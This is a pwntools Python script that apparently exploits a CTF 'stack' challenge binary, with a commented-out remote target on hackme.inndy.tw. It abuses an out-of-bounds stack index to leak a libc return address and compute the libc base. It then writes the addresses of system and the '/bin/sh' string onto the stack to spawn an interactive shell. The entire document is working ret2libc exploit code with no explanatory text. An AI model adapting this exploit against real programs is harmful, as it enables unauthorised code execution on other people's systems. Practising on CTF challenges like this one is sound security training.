from pwn import *

p = process('./stack',env = {"LD_PRELOAD":"../libc-2.23.so.i386"})
#p = remote('hackme.inndy.tw',7716)

def pop():
	p.sendlineafter('Cmd >>\n','p')

def clear():
	p.sendlineafter('Cmd >>\n','c')

def push(val):
	p.sendlineafter('Cmd >>\n','i '+str(val))
#gdb.attach(p)


# for i in range(4):
# 	pop()
# p.recvuntil(' -> ')
# data = p.recvuntil('\n',drop = True)
# if data[0] == '-':
# 	addr = 0xffffffff - int(data[1:]) + 1
# else:
# 	addr = int(data)
# elf_base = addr - 0x75a
# log.success('elf base addr : 0x%x' %elf_base)
# gdb.attach(p,'b *'+str(elf_base + 0x81b))


# for i in range(9):
# 	pop()
# p.recvuntil(' -> ')
# data = p.recvuntil('\n',drop = True)
# if data[0] == '-':
# 	addr = 0xffffffff - int(data[1:]) + 1
# else:
# 	addr = data
# libc_base = addr - 0x5bfeb
# log.success('libc base addr : 0x%x' %libc_base)


pop()
push(93)
pop()
p.recvuntil(' -> ')
data = p.recvuntil('\n',drop = True)
__libc_start_main_ret = 0xffffffff - int(data[1:]) + 1
offset___libc_start_main_ret = 0x18637
offset_system = 0x0003ad80
offset_str_bin_sh = 0x15ba3f

libc_base = __libc_start_main_ret - offset___libc_start_main_ret
log.success('libc base addr : 0x%x' %libc_base)
system_addr = libc_base + offset_system
binsh_addr = libc_base + offset_str_bin_sh
log.success('system addr : 0x%x' %system_addr)
log.success('binsh addr : 0x%x' %binsh_addr)
gdb.attach(p)
push(system_addr - 0xffffffff -1)
push('1')
push(binsh_addr - 0xffffffff -1)
p.sendline('x')

p.interactive()

